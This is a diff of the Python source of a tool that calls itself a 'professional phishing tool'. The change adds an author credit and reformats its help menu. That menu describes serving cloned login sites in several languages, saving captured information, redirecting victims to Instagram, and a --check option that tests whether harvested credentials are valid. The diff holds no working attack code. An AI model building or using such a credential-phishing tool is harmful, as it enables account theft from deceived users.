@@ -1,3 +1,7 @@
+# This tool was developed by a developer named Rickidevs
+# please rate this project on github out of respect
+# https://github.com/Rickidevs 🌟
+
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from colorama import Fore, init
 import argparse
@@ -73,15 +77,15 @@ help_menu = f"""{Fore.WHITE}
 RICK PHIS - PROFESSIONAL PHISHING TOOL
 
         Arguments            Reqired           Description 
-                          |          |                                                                                                                  
-  --site  <site_number>   |   {Fore.RED}YES{Fore.WHITE}    |    Site number (e.g., 1, 2, 3)                                                                                   |
-  --lang  <language_code> |   NO     |    Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)                                                
-  --port  <port_number>   |   NO     |    Port number (0-65535)                                                                                         
-  --output <file_name>    |   NO     |    Gets information as output                                                                                    
-  --location <url>        |   NO     |    Redirect location (default: https://instagram.com)                                                            
-  --check                 |   NO     |    It tests the entered information and shows whether it is correct. 
-                          |          |    Attention, this process may cause delays! 
-  --help                  |   NO     |    Show this help message and exit                                                                               
+                                                                                                                                                       
+  --site  <site_number>       {Fore.RED}YES{Fore.WHITE}         Site number (e.g., 1, 2, 3)                                                                                   |
+  --lang  <language_code>     NO          Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)                                                
+  --port  <port_number>       NO          Port number (0-65535)                                                                                         
+  --output <file_name>        NO          Gets information as output                                                                                    
+  --location <url>            NO          Redirect location (default: https://instagram.com)                                                            
+  --check                     NO          It tests the entered information and shows whether it is correct. 
+                                          Attention, this process may cause delays! 
+  --help                      NO          Show this help message and exit                                                                               
 """
 
 login_check = False
